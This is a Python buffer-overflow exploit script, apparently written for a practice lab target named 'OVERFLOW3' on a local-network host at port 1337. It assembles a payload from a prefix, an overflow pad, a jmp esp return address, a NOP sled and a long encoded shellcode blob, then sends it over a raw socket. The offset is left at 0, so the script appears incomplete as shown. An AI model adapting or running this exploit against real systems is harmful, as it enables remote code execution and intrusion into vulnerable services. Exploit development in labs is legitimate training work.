#! /usr/bin/python3

import socket

IP = '192.168.56.1'
PORT = 1337

prefix = b'OVERFLOW3 '
offset = 0
overflow = b'A' * offset
retn = b'\xaf\x11\x50\x62'  #jmp esp 0x625011af
padding = b'\x90' * 16

#badchars \x00\x07\x2e\xa0

shellcode =  b"\xdd\xc1\xbb\xba\xcd\xbe\x35\xd9\x74\x24\xf4\x5d\x31\xc9\xb1\x52\x31\x5d\x17\x83\xed\xfc\x03\xe7\xde\x5c\xc0\xeb\x09\x22\x2b\x13\xca\x43\xa5\xf6\xfb\x43\xd1\x73\xab\x73\x91\xd1\x40\xff\xf7\xc1\xd3\x8d\xdf\xe6\x54\x3b\x06\xc9\x65\x10\x7a\x48\xe6\x6b\xaf\xaa\xd7\xa3\xa2\xab\x10\xd9\x4f\xf9\xc9\x95\xe2\xed\x7e\xe3\x3e\x86\xcd\xe5\x46\x7b\x85\x04\x66\x2a\x9d\x5e\xa8\xcd\x72\xeb\xe1\xd5\x97\xd6\xb8\x6e\x63\xac\x3a\xa6\xbd\x4d\x90\x87\x71\xbc\xe8\xc0\xb6\x5f\x9f\x38\xc5\xe2\x98\xff\xb7\x38\x2c\x1b\x1f\xca\x96\xc7\xa1\x1f\x40\x8c\xae\xd4\x06\xca\xb2\xeb\xcb\x61\xce\x60\xea\xa5\x46\x32\xc9\x61\x02\xe0\x70\x30\xee\x47\x8c\x22\x51\x37\x28\x29\x7c\x2c\x41\x70\xe9\x81\x68\x8a\xe9\x8d\xfb\xf9\xdb\x12\x50\x95\x57\xda\x7e\x62\x97\xf1\xc7\xfc\x66\xfa\x37\xd5\xac\xae\x67\x4d\x04\xcf\xe3\x8d\xa9\x1a\xa3\xdd\x05\xf5\x04\x8d\xe5\xa5\xec\xc7\xe9\x9a\x0d\xe8\x23\xb3\xa4\x13\xa4\x7c\x90\x23\x5e\x15\xe3\x53\x9f\x5e\x6a\xb5\xf5\xb0\x3b\x6e\x62\x28\x66\xe4\x13\xb5\xbc\x81\x14\x3d\x33\x76\xda\xb6\x3e\x64\x8b\x36\x75\xd6\x1a\x48\xa3\x7e\xc0\xdb\x28\x7e\x8f\xc7\xe6\x29\xd8\x36\xff\xbf\xf4\x61\xa9\xdd\x04\xf7\x92\x65\xd3\xc4\x1d\x64\x96\x71\x3a\x76\x6e\x79\x06\x22\x3e\x2c\xd0\x9c\xf8\x86\x92\x76\x53\x74\x7d\x1e\x22\xb6\xbe\x58\x2b\x93\x48\x84\x9a\x4a\x0d\xbb\x13\x1b\x99\xc4\x49\xbb\x66\x1f\xca\xcb\x2c\x3d\x7b\x44\xe9\xd4\x39\x09\x0a\x03\x7d\x34\x89\xa1\xfe\xc3\x91\xc0\xfb\x88\x15\x39\x76\x80\xf3\x3d\x25\xa1\xd1"

payload = prefix + overflow + retn + padding + shellcode
try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(3)
        s.connect((IP, PORT))
        print('Sending evil buffer...')
        s.send(payload)
        print('Done!')
except:
    print('Could not connect to remote host')
